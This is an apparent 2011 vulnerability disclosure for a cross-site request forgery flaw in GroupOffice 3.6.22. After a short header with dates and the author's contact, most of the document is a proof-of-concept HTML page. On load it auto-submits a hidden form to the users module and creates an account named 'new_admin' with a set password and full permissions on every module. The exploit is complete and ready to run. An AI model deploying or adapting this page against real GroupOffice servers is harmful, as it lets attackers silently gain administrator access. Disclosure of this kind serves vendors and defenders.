<!------------------------------------------------------------------------
# Software................GroupOffice 3.6.22
# Vulnerability...........Cross-site Request Forgery
# Threat Level............Low (1/5)
# Download................http://www.group-office.com/
# Vendor Contact Date.....3/10/2011
# Disclosure Date.........3/24/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A cross-site request forgery vulnerability in GroupOffice 3.6.22 can
# be exploited to create a new admin.
# 
# 
# --PoC-->

<html>
    <body onload="document.forms[0].submit()">
        <form method="POST" action="http://localhost/groupoffice-com-3.6.22/modules/users/action.php">
            <input type="hidden" name="modules" value="[{&quot;id&quot;:&quot;summary&quot;,&quot;name&quot;:&quot;Startpage&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;email&quot;,&quot;name&quot;:&quot;Email&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;calendar&quot;,&quot;name&quot;:&quot;Calendar&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;tasks&quot;,&quot;name&quot;:&quot;Tasks&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;addressbook&quot;,&quot;name&quot;:&quot;Addressbook&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;files&quot;,&quot;name&quot;:&quot;Files&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;notes&quot;,&quot;name&quot;:&quot;Notes&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;blacklist&quot;,&quot;name&quot;:&quot;IP blacklist&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;bookmarks&quot;,&quot;name&quot;:&quot;Bookmarks&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;comments&quot;,&quot;name&quot;:&quot;Comments&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;dav&quot;,&quot;name&quot;:&quot;WebDAV server&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;emailportlet&quot;,&quot;name&quot;:&quot;Email Portlet&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;groups&quot;,&quot;name&quot;:&quot;Groups&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;links&quot;,&quot;name&quot;:&quot;Link descriptions&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;log&quot;,&quot;name&quot;:&quot;Log&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;mailings&quot;,&quot;name&quot;:&quot;E-mail templates and addresslists&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;modules&quot;,&quot;name&quot;:&quot;Modules&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;search&quot;,&quot;name&quot;:&quot;Search&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;tools&quot;,&quot;name&quot;:&quot;Tools&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true},{&quot;id&quot;:&quot;users&quot;,&quot;name&quot;:&quot;Users&quot;,&quot;read_permission&quot;:true,&quot;write_permission&quot;:true}]" />
            <input type="hidden" name="groups_visible" value="[{&quot;id&quot;:&quot;1&quot;,&quot;visible_permission&quot;:false},{&quot;id&quot;:&quot;2&quot;,&quot;visible_permission&quot;:false},{&quot;id&quot;:&quot;3&quot;,&quot;visible_permission&quot;:false}]" />
            <input type="hidden" name="group_member" value="[{&quot;id&quot;:&quot;1&quot;,&quot;group_permission&quot;:&quot;1&quot;},{&quot;id&quot;:&quot;2&quot;,&quot;group_permission&quot;:true},{&quot;id&quot;:&quot;3&quot;,&quot;group_permission&quot;:false}]" />
            <input type="hidden" name="task" value="save_user" />
            <input type="hidden" name="user_id" value="" />
            <input type="hidden" name="username" value="new_admin" />
            <input type="hidden" name="password1" value="Password1" />
            <input type="hidden" name="password2" value="Password1" />
            <input type="hidden" name="enabled" value="on" />
            <input type="hidden" name="first_name" value="a" />
            <input type="hidden" name="middle_name" value="" />
            <input type="hidden" name="last_name" value="a" />
            <input type="hidden" name="title" value="" />
            <input type="hidden" name="initials" value="" />
            <input type="hidden" name="sex" value="M" />
            <input type="hidden" name="birthday" value="" />
            <input type="hidden" name="email" value="z@z.com" />
            <input type="hidden" name="home_phone" value="" />
            <input type="hidden" name="address" value="" />
            <input type="hidden" name="address_no" value="" />
            <input type="hidden" name="zip" value="" />
            <input type="hidden" name="city" value="" />
            <input type="hidden" name="state" value="" />
            <input type="hidden" name="country" value="NL" />
            <input type="hidden" name="fax" value="" />
            <input type="hidden" name="cellular" value="" />
            <input type="hidden" name="company" value="" />
            <input type="hidden" name="department" value="" />
            <input type="hidden" name="function" value="" />
            <input type="hidden" name="work_address" value="" />
            <input type="hidden" name="work_address_no" value="" />
            <input type="hidden" name="work_zip" value="" />
            <input type="hidden" name="work_city" value="" />
            <input type="hidden" name="work_state" value="" />
            <input type="hidden" name="work_country" value="NL" />
            <input type="hidden" name="work_phone" value="" />
            <input type="hidden" name="work_fax" value="" />
            <input type="hidden" name="homepage" value="" />
            <input type="hidden" name="language" value="en" />
            <input type="hidden" name="timezone" value="Europe/Amsterdam" />
            <input type="hidden" name="date_format" value="dmY" />
            <input type="hidden" name="date_separator" value="-" />
            <input type="hidden" name="time_format" value="G:i" />
            <input type="hidden" name="first_weekday" value="1" />
            <input type="hidden" name="thousands_separator" value="." />
            <input type="hidden" name="decimal_separator" value="," />
            <input type="hidden" name="currency" value="â‚¬" />
            <input type="hidden" name="list_separator" value=";" />
            <input type="hidden" name="text_separator" value="&quot;" />
            <input type="hidden" name="theme" value="Default" />
            <input type="hidden" name="start_module" value="summary" />
            <input type="hidden" name="max_rows_list" value="20" />
            <input type="hidden" name="sort_name" value="last_name" />
        </form>
    </body>
</html>
